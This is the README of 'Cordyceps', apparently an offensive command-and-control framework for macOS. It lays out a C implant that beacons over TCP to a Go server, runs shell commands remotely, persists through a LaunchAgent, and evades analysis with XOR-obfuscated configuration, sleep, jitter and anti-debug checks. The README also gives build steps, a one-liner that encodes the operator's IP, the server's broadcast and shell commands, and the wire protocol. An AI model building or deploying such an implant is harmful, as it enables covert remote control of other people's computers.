# Cordyceps

macOS C2 framework. Agent written in C, server in Go.

---

## Architecture

```
agent (C)          →   TCP beacon   →   server (Go)
posix_spawn exec                        multi-agent CLI
LaunchAgent persist                     broadcast / select
XOR string enc                          shell queue
startup sleep
jitter interval
anti-debug
```

---

## Agent

| File | |
|---|---|
| `main.c` | beacon loop, command dispatch |
| `beacon.c` | TCP protocol — CHECKIN / CMD / RESP |
| `shell.c` | command exec via posix_spawn + pipe |
| `persist.c` | LaunchAgent install |
| `evasion.c` | startup sleep, jitter, anti-debug |
| `config.h` | XOR-encrypted C2 host, port, label |

**Build:**
```sh
cd agent && make
```

**Config** — edit `config.h` before building:
```python
# Gera arrays XOR para qualquer string:
python3 -c "k=0x4D; s='SEU_IP'; print('{'+','.join(hex(ord(c)^k) for c in s)+'}')"
```

---

## Server

```sh
cd server && go run cordyceps.go
```

**Commands:**

```
show                    list agents
select <id>             select agent
exit                    deselect
shell <cmd>             run command on selected agent
broadcast <cmd>         run command on all agents
```

---

## Protocol

```
agent → server:   CHECKIN <id>
server → agent:   IDLE
                  CMD shell <command>
agent → server:   RESP <id> <output>
```
